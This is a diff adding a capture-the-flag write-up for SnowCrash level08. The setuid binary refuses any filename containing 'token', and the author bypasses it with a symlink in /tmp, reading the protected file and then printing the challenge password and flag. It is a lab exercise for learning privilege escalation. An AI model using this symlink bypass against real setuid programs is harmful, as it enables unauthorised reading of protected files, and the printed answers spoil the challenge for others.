@@ -1,0 +1,51 @@
+# Okay lets see what we have by doing a ls -la
+
+level08@SnowCrash:~$ ls -la
+total 28
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
+-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
+-r-x------  1 level08 level08  675 Apr  3  2012 .profile
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+# Lets see what happens when running the file
+
+level08@SnowCrash:~$ ./level08
+./level08 [file to read]
+
+# Lets see whats happens when giving it token
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+level08@SnowCrash:~$ echo ~/token > /tmp/mytoken; cat /tmp/mytoken && ./level08 /tmp/mytoken
+/home/user/level08/token
+You may not access '/tmp/mytoken'
+
+# So no matter what, we can not access the keyname token with program level08
+
+# Now time to use knowledge gained from nm & otool with ln -s for linking files 
+#		Note the -s is to make it a symbolic link and will solve the above problem
+#	The token file must be passed to level08, We only need to link the information as level08 has the rights to read the file anyway
+#	It will be done with the code below, We will create a GabeToken that will link to the token and access the same information 
+#		This information then can be sent to level08 as it doesn't have the name "token" in it (yes it is case sensetive)
+
+ln -s ~/token /tmp/GabeToken; ./level08 /tmp/GabeToken
+quif5eloekouj29ke0vouxean
+
+# Remember we only got the token which is the password to unlocking the flag08, We did not capture the flag directly
+
+level08@SnowCrash:~$ su flag08
+Password: quif5eloekouj29ke0vouxean
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+# What we learnt
+#	The program was hard coded to only ignore any file with the name "token" inside of it name and by using the 
+#		symbolic linking to link token content to our own file (alising the file) so that it will read the token file
+
+Resources
+http://theory.uwinnipeg.ca/UNIXhelp/tasks/links.html
+https://unix.stackexchange.com/questions/87200/change-permissions-for-a-symbolic-link
